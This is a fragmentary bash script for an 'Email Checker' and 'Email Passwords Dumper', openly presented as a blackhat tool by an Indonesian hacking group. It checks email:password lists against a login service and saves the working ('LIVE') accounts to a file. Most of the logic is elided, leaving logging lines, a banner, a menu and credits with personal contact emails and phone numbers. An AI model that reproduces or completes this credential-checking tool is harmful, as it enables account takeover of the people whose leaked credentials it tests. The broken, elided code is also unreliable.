...
#DI BUAT OPEN SOURCE KEEP STILL BLACKHAT
#SUPAYA KALIAN JUGA BISA BERKARYA
#/////////////////////////////////////////////////////////////////////////
#//Author: By ./XDark-Screm    Developer: MrxyVsScp@MrXDx1  feat Mr_Vektor.404iD                                 //
...
#//                /NGA USAH BUAT PENCITRAAN          Lupyu                   //
#/////////////////////////////////////////////////////////////////////////
N='\033[0m'
R='\033[0;31m'
G='\033[0;32m'
      ...
      then
        ...
        then
           ...
           then
              ...
              then
                 echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}]${O} Failed captcha => $email$del$pass ${N}|${O} Checked By A. Rahmdani & Arya Maker Hazamansyah & MrVxDxsScp"
              else
                 echo "LIVE => $email$del$pass" >> $acc-$list.txt
                 echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${G}LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|${G} Checked By A. Rahmadani & Arya Maker & MrVxDxsScp"
              fi
           else
              echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${R}DIE => $email$del$pass ${N}|${R} Checked By A. Rahmadani & Arya maker MrVxDxsScp"
              echo "bad" >> .0-$list
           fi
        else
          if [[ "$get" = "" ]]
           then  
                if [[ "$hash" = "y" ]];then
                   ...
                   echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${R}DIE => ${R}$email$del$pass ${N}|${R} Checked By A. Rahmadani & Arya Maker & MrVxDxsScp"
...
if [[ "$hash" = "y" ]];then
   ...
   echo -e "-------[ checked RSecxXx7.ID & by A. Rahmadani Tools checker feat Arya Maker ]--------\n" >> $acc-$list
   echo -e "${N}[*] Done.....\n[+] Result : ${G}$acc-$list${N}"
...
|___ |___ |  | | \_ |___ |__/ 
       ...
       `date`
Email Checker && Opensource Email Passwords Dumper In Pro Version LIMITTED EDITIONSv.10
           have a nice day Salam INDONESIA-SYNDICATE-XDARK Gh0sT Sec  | Blackhat Sec666 Gh0sT | SECURITY AGENCY_x7 | Merak Banten Cyber Team|Hacker Patah Hati $N
[?] ${G}A. Rahmadani & Arya Maker & MrVxDxScp TOOLS PRO LIMITTED EDITIONS MENU${N}
...
[18]. ABOUT A. Rahmadani & By  Arya maker  & MrVxDxScp Tools Enggine"
...
;;
 ...
 ;; 
 18) echo -e "
         |${G} A. Rahmadani & Arya MAKER TOOLS CLI LIMMITED EDITIONS PRO VERSION ${N}|
...
-THANKS TO || INDONESIAN SYNDICATE | SECURITY AGENCY_X7|Lampung Cyber Team
-CoD3d By./Arya maker 
-Contact Email : riobeatdownjr@gmail.com WhatsApp : +6283172335488
-Contact Email : xdarkscrem@gmail.com WhatsApp: +6285814480623
- Contact Email: Mrvxdxvscp Gak Punya Email Bg xixixi.
Get All New Version Contact A. Rahmdani feat Arya maker & Mrvxdxvscp
Thx to:${O} INDONESIA-SYNDICATE-XDARK Gh0sT | Blackhat Sec666 Gh0sT | SECURITY AGENCY_x7 | Hacker Patah Hati |Banten Cyber Team - Leaked Data Community${N}"
